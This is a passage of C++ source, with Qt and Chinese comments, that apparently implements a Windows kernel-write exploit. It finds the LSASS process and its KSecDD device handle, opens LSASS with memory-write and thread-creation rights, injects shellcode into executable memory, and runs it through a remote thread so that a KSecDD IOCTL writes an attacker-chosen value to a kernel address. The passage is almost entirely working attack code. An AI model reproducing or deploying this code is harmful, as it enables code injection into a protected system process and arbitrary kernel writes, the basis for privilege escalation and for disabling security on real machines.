                    .arg(static_cast<unsigned long>(debugPrivStatus), 8, 16, QChar('0')));
        }

        // 第一步：获取 NtDeviceIoControlFile 在本进程中的地址。
        // LSASS 和本进程的 ntdll 加载基址相同（系统 DLL 全局共享），
        // 因此本进程取到的函数指针可直接用于 LSASS 中的 shellcode。
        const auto ioControlFn = resolveNtDeviceIoControlFile();
        if (ioControlFn == nullptr)
        {
            result.failureText = QStringLiteral("无法获取 NtDeviceIoControlFile 入口。");
            return result;
        }
        const auto ntDeviceIoAddr =
            reinterpret_cast<std::uint64_t>(ioControlFn);
        result.traceLines.append(
            QStringLiteral("NtDeviceIoControlFile = 0x%1")
                .arg(ntDeviceIoAddr, 16, 16, QChar('0')));

        // 第二步：找到 LSASS 的 PID。
        const DWORD lsassPid = findLsassPid(result.traceLines);
        if (lsassPid == 0)
        {
            result.failureText = QStringLiteral("未找到 lsass.exe 进程。");
            return result;
        }

        // 第三步：在 LSASS 的句柄中找到 KSecDD 设备句柄。
        const unsigned short ksecHandle = findLsassKsecDdHandle(lsassPid, result.traceLines);
        if (ksecHandle == 0)
        {
            result.failureText = QStringLiteral(
                "LSASS 中未找到 KSecDD 句柄。LSASS 可能以 PPL 运行或尚未建立 KSecDD 连接。");
            return result;
        }

        // 第四步：打开 LSASS 进程（需要读写内存和创建线程的权限）。
        const HANDLE lsassProcess = ::OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
            FALSE,
            lsassPid);
        if (lsassProcess == nullptr)
        {
            result.failureText =
                QStringLiteral("无法打开 LSASS 进程（PID %1），Win32 错误 %2。")
                    .arg(lsassPid)
                    .arg(::GetLastError());
            return result;
        }

        // 第五步：构建 shellcode 并写入 LSASS。
        const auto shellcode = buildLsassShellcode(
            ksecHandle, ntDeviceIoAddr, gadgetAddress, targetAddress, value);

        // 在 LSASS 中分配可执行内存。
        void* const remoteBase = ::VirtualAllocEx(
            lsassProcess,
            nullptr,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (remoteBase == nullptr)
        {
            const DWORD allocError = ::GetLastError();
            ::CloseHandle(lsassProcess);
            result.failureText =
                QStringLiteral("VirtualAllocEx 失败，Win32 错误 %1。")
                    .arg(allocError);
            return result;
        }
        result.traceLines.append(
            QStringLiteral("LSASS 中分配内存 = 0x%1，大小 = %2")
                .arg(reinterpret_cast<std::uint64_t>(remoteBase), 16, 16, QChar('0'))
                .arg(shellcode.size()));

        // 写入 shellcode + 数据块。
        SIZE_T written = 0;
        if (::WriteProcessMemory(
                lsassProcess, remoteBase,
                shellcode.data(), shellcode.size(),
                &written) == FALSE
            || written != shellcode.size())
        {
            ::VirtualFreeEx(lsassProcess, remoteBase, 0, MEM_RELEASE);
            ::CloseHandle(lsassProcess);
            result.failureText = QStringLiteral("WriteProcessMemory 失败。");
            return result;
        }

        // 第六步：创建远程线程执行 shellcode。
        // 线程参数 = remoteBase（shellcode 用 RCX 取参数块基址）。
        DWORD threadId = 0;
        const HANDLE remoteThread = ::CreateRemoteThread(
            lsassProcess,
            nullptr,
            0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteBase),
            remoteBase,
            0,
            &threadId);
        if (remoteThread == nullptr)
        {
            const DWORD threadError = ::GetLastError();
            ::VirtualFreeEx(lsassProcess, remoteBase, 0, MEM_RELEASE);
            ::CloseHandle(lsassProcess);
            result.failureText =
                QStringLiteral("CreateRemoteThread 失败，Win32 错误 %1。")
                    .arg(threadError);
            return result;
        }
        result.traceLines.append(
            QStringLiteral("远程线程已创建，ThreadId = %1").arg(threadId));

        // 等待线程执行完毕（超时 10 秒）。
        const DWORD waitResult = ::WaitForSingleObject(remoteThread, 10000);
        ::CloseHandle(remoteThread);

        if (waitResult != WAIT_OBJECT_0)
        {
            // 超时时不释放远程内存——线程可能仍在执行，
            // VirtualFreeEx 会拉掉正在运行的代码页导致 LSASS 崩溃。
            // 泄漏 168 字节比崩溃 LSASS 安全得多。
            ::CloseHandle(lsassProcess);
            result.failureText =
                QStringLiteral("远程线程等待超时或失败，WaitResult = %1。"
                               "远程内存未释放以避免 LSASS 崩溃。")
                    .arg(waitResult);
            return result;
        }

        // 第七步：读回数据块中的 NTSTATUS 结果。
        constexpr std::size_t kCodeSize = 96;
        constexpr std::size_t kOffResult = 0x30;
        std::uint32_t ioctlResult = 0;
        SIZE_T readBytes = 0;
        const auto* const resultAddr =
            static_cast<const unsigned char*>(remoteBase) + kCodeSize + kOffResult;
        const BOOL readOk = ::ReadProcessMemory(
            lsassProcess,
            resultAddr,
            &ioctlResult,
            sizeof(ioctlResult),
            &readBytes);

        // 检查 ReadProcessMemory 是否成功。
        if (readOk == FALSE || readBytes != sizeof(ioctlResult))
        {
            const DWORD rpmError = ::GetLastError();
            ::VirtualFreeEx(lsassProcess, remoteBase, 0, MEM_RELEASE);
            ::CloseHandle(lsassProcess);
            result.failureText = QStringLiteral(
                "远程线程已完成，但 ReadProcessMemory 失败（Win32 错误 %1）。"
                "IOCTL 可能已执行但无法确认结果。")
                    .arg(rpmError);
            return result;
        }

        result.ioctlStatus = static_cast<long>(ioctlResult);
        result.traceLines.append(
            QStringLiteral("IOCTL 返回 NTSTATUS = 0x%1")
                .arg(ioctlResult, 8, 16, QChar('0')));

        // STATUS_PENDING (0x103)：NtDeviceIoControlFile 异步完成。
        // 读回 IO_STATUS_BLOCK 取最终状态（内存尚未释放）。
        constexpr std::uint32_t kStatusPending = 0x00000103U;
        if (ioctlResult == kStatusPending)
        {
            constexpr std::size_t kOffIosb = 0x38;
            std::uint32_t finalStatus = 0;
            SIZE_T iosbRead = 0;
            const auto* const iosbAddr =
                static_cast<const unsigned char*>(remoteBase)
                + kCodeSize + kOffIosb;
            // IO_STATUS_BLOCK.Status 是前 4 字节（long / NTSTATUS）。
            ::ReadProcessMemory(
                lsassProcess, iosbAddr,
                &finalStatus, sizeof(finalStatus), &iosbRead);
            result.traceLines.append(
                QStringLiteral("IO_STATUS_BLOCK.Status = 0x%1")
                    .arg(finalStatus, 8, 16, QChar('0')));
            ioctlResult = finalStatus;
            result.ioctlStatus = static_cast<long>(finalStatus);
        }

        // 清理 LSASS 中分配的内存（线程已完成，安全释放）。
        ::VirtualFreeEx(lsassProcess, remoteBase, 0, MEM_RELEASE);
        ::CloseHandle(lsassProcess);

        // STATUS_SUCCESS = 0 表示成功。
        result.ok = (ioctlResult == 0);
        if (!result.ok)
        {
            result.failureText =
                QStringLiteral("KSecDD IOCTL 返回非零状态 0x%1，内核写可能未执行。")
                    .arg(ioctlResult, 8, 16, QChar('0'));
        }
        return result;
    }
}
